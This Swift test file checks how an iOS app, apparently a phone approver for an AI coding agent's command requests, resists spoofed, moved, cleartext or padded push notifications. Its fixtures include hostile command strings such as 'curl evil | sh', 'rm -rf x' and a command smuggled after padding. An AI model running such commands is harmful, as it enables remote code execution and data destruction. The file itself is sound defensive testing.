import CryptoKit
import SideAProtocol
import SideARemoteKit
import SideARemoteShared
import UserNotifications
import XCTest
@testable import SideARemote

@MainActor
final class PushOpenerTests: XCTestCase {
    private let key = PushKey(key: SymmetricKey(size: .bits256), keyID: Data([1, 2, 3, 4]))

    private let keychain = SharedKeychain.shared
    private var savedMacs: Data?

    override func setUp() async throws {
        savedMacs = keychain.data("macs")
        let mac = PairedMac(endpoint: Endpoint(macID: "spoof-mac", baseURL: URL(string: "https://100.64.0.1:47800")!, serverKeyHash: "k", name: "MacBook Pro"),
                            deviceID: "d1", deviceName: "iPhone")
        XCTAssertTrue(keychain.set(try JSONEncoder().encode([mac]), for: "macs"))
    }

    override func tearDown() async throws {
        keychain.set(savedMacs, for: "macs")
    }

    private func seal(_ payload: PushPayload, category: PushCategory = .request, collapseID: String = "r1", deviceID: String = "d1") throws -> String {
        try PushEnvelope.seal(try JSONEncoder().encode(payload), with: key, category: category, collapseID: collapseID, deviceID: deviceID)
    }

    private func request(gate: AllowGate) -> PushPayload {
        PushPayload(t: "request", mac: "m1", sent: 0, rid: "r1", sid: "s1", title: "Allow Bash", subtitle: "side-a · Work",
                    body: "swift test", gate: gate, agent: .claude)
    }

    func testARequestOpensWithTheMacsWords() throws {
        let sealed = try seal(request(gate: .unlock))
        guard case .opened(let payload, let data) = PushOpener.open(sealed, key: key, deviceID: "d1", macID: "m1", category: .request, collapseID: "r1")
        else { return XCTFail("didn't open") }
        let content = UNMutableNotificationContent()
        content.userInfo = ["e": sealed]
        PushOpener.fill(content, with: payload, data: data, category: .request, identifier: "r1")
        XCTAssertEqual(content.title, "Allow Bash")
        XCTAssertEqual(content.body, "swift test")
        XCTAssertEqual(content.threadIdentifier, "side-a")
        XCTAssertEqual(content.categoryIdentifier, "REQUEST")
        XCTAssertNil(content.userInfo["e"])
        XCTAssertEqual(content.userInfo["rid"] as? String, "r1")
        XCTAssertEqual(PushPayload(userInfo: content.userInfo)?.rid, "r1")
    }

    func testAPayloadMovedElsewhereDoesNotOpen() throws {
        let sealed = try seal(request(gate: .unlock), category: .finished)
        // The relay put a FINISHED payload under REQUEST, which has an Allow button.
        XCTAssertUnreadable(PushOpener.open(sealed, key: key, deviceID: "d1", macID: "m1", category: .request, collapseID: "r1"))
        let other = try seal(request(gate: .unlock))
        XCTAssertUnreadable(PushOpener.open(other, key: key, deviceID: "d1", macID: "m1", category: .request, collapseID: "r2"))
        XCTAssertUnreadable(PushOpener.open(other, key: key, deviceID: "d2", macID: "m1", category: .request, collapseID: "r1"))
        XCTAssertUnreadable(PushOpener.open(other, key: key, deviceID: "d1", macID: "another-mac", category: .request, collapseID: "r1"))
    }

    func testAnUnreadablePushOffersOnlyOpen() {
        let content = UNMutableNotificationContent()
        content.userInfo = ["e": "x"]
        content.categoryIdentifier = "REQUEST"
        PushOpener.generic(content, body: nil)
        XCTAssertEqual(content.categoryIdentifier, "OPEN")
        XCTAssertNil(content.userInfo["e"])
    }

    private func XCTAssertUnreadable(_ opened: PushOpener.Opened, file: StaticString = #filePath, line: UInt = #line) {
        if case .unreadable = opened { return }
        XCTFail("opened", file: file, line: line)
    }

    func testACutCommandOffersOpenOnly() throws {
        let cut = PushPayload(t: "request", mac: "m1", sent: 0, rid: "r1", sid: "s1", title: "Allow Bash", body: "npm test", gate: .lockScreen,
                              full: false)
        guard case .opened(let payload, let data) = PushOpener.open(try seal(cut), key: key, deviceID: "d1", macID: "m1", category: .request,
                                                                    collapseID: "r1") else { return XCTFail() }
        let content = UNMutableNotificationContent()
        PushOpener.fill(content, with: payload, data: data, category: .request, identifier: "r1")
        XCTAssertEqual(content.categoryIdentifier, "OPEN")
        XCTAssertTrue(content.body.hasSuffix("Open to see the full command."))
    }

    /// What the attack leaves on the phone: the real sealed push opened and cached for `r1`, then a cleartext push under
    /// the same collapse id, with no `mutable-content`, saying something harmless.
    func testASecondPushUnderTheSameIDCantChangeTheWords() throws {
        let real = PushPayload(t: "request", mac: "spoof-mac", sent: 0, rid: "spoof-r1", sid: "s1", title: "Allow Bash",
                               subtitle: "side-a · Work", body: "curl evil | sh", gate: .unlock, agent: .claude)
        let data = try JSONEncoder().encode(real)
        let filled = UNMutableNotificationContent()
        PushOpener.fill(filled, with: real, data: data, category: .request, identifier: "spoof-r1")
        defer { PushCache.remove("spoof-r1") }
        XCTAssertNotNil(PushOpener.verified(UNNotificationRequest(identifier: "spoof-r1", content: filled, trigger: nil)))

        let spoof = UNMutableNotificationContent()
        spoof.title = "Allow Read"
        spoof.subtitle = "side-a · Work"
        spoof.body = "README.md"
        spoof.categoryIdentifier = "REQUEST"
        XCTAssertNil(PushOpener.verified(UNNotificationRequest(identifier: "spoof-r1", content: spoof, trigger: nil)))
        for change in [\UNMutableNotificationContent.title, \.subtitle, \.body] {
            guard let one = filled.mutableCopy() as? UNMutableNotificationContent else { return XCTFail() }
            one[keyPath: change] = "changed"
            XCTAssertNil(PushOpener.verified(UNNotificationRequest(identifier: "spoof-r1", content: one, trigger: nil)))
        }
    }

    func testASecondPushCantChangeTheCategory() throws {
        func shown(_ payload: PushPayload, as category: String) throws -> Bool {
            let filled = UNMutableNotificationContent()
            PushOpener.fill(filled, with: payload, data: try JSONEncoder().encode(payload), category: payload.gate == .biometric ? .requestDestructive : .request,
                            identifier: "spoof-c")
            defer { PushCache.remove("spoof-c") }
            filled.categoryIdentifier = category
            return PushOpener.verified(UNNotificationRequest(identifier: "spoof-c", content: filled, trigger: nil)) != nil
        }
        func payload(_ gate: AllowGate) -> PushPayload {
            PushPayload(t: "request", mac: "spoof-mac", sent: 0, rid: "spoof-c", title: "Allow Bash", body: "rm -rf x", gate: gate)
        }
        XCTAssertTrue(try shown(payload(.biometric), as: "REQUEST_DESTRUCTIVE"))
        XCTAssertFalse(try shown(payload(.biometric), as: "REQUEST"))
        XCTAssertFalse(try shown(payload(.biometric), as: "PLAN"))
        XCTAssertTrue(try shown(payload(.unlock), as: "REQUEST"))
        XCTAssertFalse(try shown(payload(.unlock), as: "REQUEST_SAFE"))
        XCTAssertFalse(try shown(payload(.unlock), as: "PLAN"))
    }

    func testTheReviewDemosOwnRequestStillVerifies() throws {
        PushCache.store(try JSONEncoder().encode(ReviewDemo.payload), for: ReviewDemo.requestID)
        defer { PushCache.remove(ReviewDemo.requestID) }
        let request = UNNotificationRequest(identifier: ReviewDemo.requestID, content: ReviewDemo.content(ReviewDemo.payload), trigger: nil)
        XCTAssertEqual(PushOpener.verified(request)?.rid, ReviewDemo.requestID)
    }

    /// With nothing opened here, a card says nothing the push said, and offers only Open.
    func testACardWithoutAPayloadShowsNoneOfThePushsWords() {
        let card = NotificationCardModel(category: "REQUEST", payload: nil)
        XCTAssertEqual(card.title, "Side A")
        XCTAssertEqual(card.subtitle, "")
        XCTAssertEqual(card.body, "")
        XCTAssertEqual(NotificationCategories.actions(for: nil)?.map(\.identifier), ["OPEN"])
        XCTAssertNil(NotificationCategories.actions(for: request(gate: .unlock)))
    }

    func testACardShowsThePayloadsWords() {
        let card = NotificationCardModel(category: "REQUEST", payload: request(gate: .unlock))
        XCTAssertEqual(card.title, "Allow Bash")
        XCTAssertEqual(card.subtitle, "side-a · Work")
        XCTAssertEqual(card.body, "swift test")
    }

    func testAnythingHiddenInARequestLosesTheLockScreensAllow() throws {
        let hidden = PushPayload(t: "request", mac: "spoof-mac", sent: 0, rid: "esc", title: "Read a file", body: "README\u{202E}dm.txt", gate: .lockScreen)
        let filled = UNMutableNotificationContent()
        PushOpener.fill(filled, with: hidden, data: try JSONEncoder().encode(hidden), category: .request, identifier: "esc")
        defer { PushCache.remove("esc") }
        XCTAssertEqual(filled.categoryIdentifier, "REQUEST")
        XCTAssertEqual(filled.body, "README\\u{202E}dm.txt")
        XCTAssertFalse(PushOpener.allowsLocked(hidden))
        XCTAssertNotNil(PushOpener.verified(UNNotificationRequest(identifier: "esc", content: filled, trigger: nil)))
        XCTAssertTrue(PushOpener.allowsLocked(request(gate: .lockScreen)))
    }

    /// An old Mac says `full` for a command padded past the card; the phone judges for itself.
    func testACommandPaddedPastTheCardOpensWhateverTheMacSays() throws {
        for padding in [String(repeating: "\u{2003}", count: 400), String(repeating: "\u{2800}", count: 400), String(repeating: "x", count: 500)] {
            let padded = PushPayload(t: "request", mac: "m1", sent: 0, rid: "pad", title: "Run a command", body: "ls" + padding + "; python3 x", gate: .lockScreen, full: true)
            XCTAssertFalse(PushOpener.allowsLocked(padded))
            XCTAssertTrue(PushOpener.cutOff(padded))
            let filled = UNMutableNotificationContent()
            PushOpener.fill(filled, with: padded, data: try JSONEncoder().encode(padded), category: .request, identifier: "pad")
            defer { PushCache.remove("pad") }
            XCTAssertEqual(filled.categoryIdentifier, "OPEN")
        }
    }

    func testCleartextIsNeverActedOn() {
        // A push someone else wrote: a Lock Screen category and a payload in the clear, nothing opened here.
        let payload = PushPayload(t: "request", mac: "m1", sent: 0, rid: "forged", title: "Read README.md", gate: .lockScreen)
        let content = UNMutableNotificationContent()
        content.categoryIdentifier = "REQUEST_SAFE"
        content.userInfo = ["p": (try? JSONSerialization.jsonObject(with: JSONEncoder().encode(payload))) ?? [:]]
        XCTAssertNil(PushOpener.verified(UNNotificationRequest(identifier: "forged", content: content, trigger: nil)))
    }
}
